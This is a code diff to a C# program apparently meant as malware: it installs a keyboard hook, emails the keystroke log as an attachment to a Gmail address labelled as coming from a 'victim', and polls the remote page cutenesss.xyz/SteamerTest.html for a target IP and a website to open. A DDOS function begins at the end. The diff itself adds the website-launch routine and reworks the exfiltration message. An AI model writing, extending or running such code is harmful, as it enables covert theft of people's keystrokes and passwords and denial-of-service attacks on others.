@@ -23,6 +23,7 @@ namespace Karios
         private static IntPtr _hookID = IntPtr.Zero;
         private static string LocalIP;
         private static string GlobalTargetIP;
+        private static string Website;
         
         public static void Main()
         {
@@ -46,7 +47,7 @@ namespace Karios
                     UnhookWindowsHookEx(_hookID);
                     if (!webData.ToUpperInvariant().Contains("ip:"))
                     {
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopas";
+                        string search = "qwertyuiopasdfghjklzxcvbnmqwertyuiopasqwertyuiopasdfg";
                         string IPTarget = webData.Substring(webData.IndexOf(search) + search.Length);
                         IPTarget = IPTarget.Replace(@"</p>", "");
                         // IPTarget = IP on cutenesss.xyz/SteamerTest.html
@@ -102,8 +103,7 @@ namespace Karios
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
-                        mail.Body = "New kelogging file from victim () , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
-
+                        mail.Body = "New log file from Computer (" + GetLocalIP(LocalIP)+ " , finshed at: " + DateTime.Now.ToString("yyyy-MM-dd");
                         Attachment attachment;
                         attachment = new Attachment(pathToLog);
                         mail.Attachments.Add(attachment);
@@ -185,6 +185,26 @@ namespace Karios
             }
         }
 
+        public static void LaunchWebsite()
+        {
+            using (WebClient wc = new WebClient())
+            {
+                try
+                {
+                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
+                    if (!webData.ToUpperInvariant().Contains("Website:"))
+                    {   
+                        //this is broken (The search gets everything next to the Website:)
+                        string search = "qwertyuiopasdfghjklzxcvbnmqwe";
+                        string Website = webData.Substring(webData.IndexOf(search) + search.Length);
+                        Website = Website.Replace(@"</p>", "");
+                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
+                        //Process.Start(Website);
+                    }
+                }
+                catch { }
+            }
+        }
         public static void DDOS()
         {
             using (WebClient wc = new WebClient())
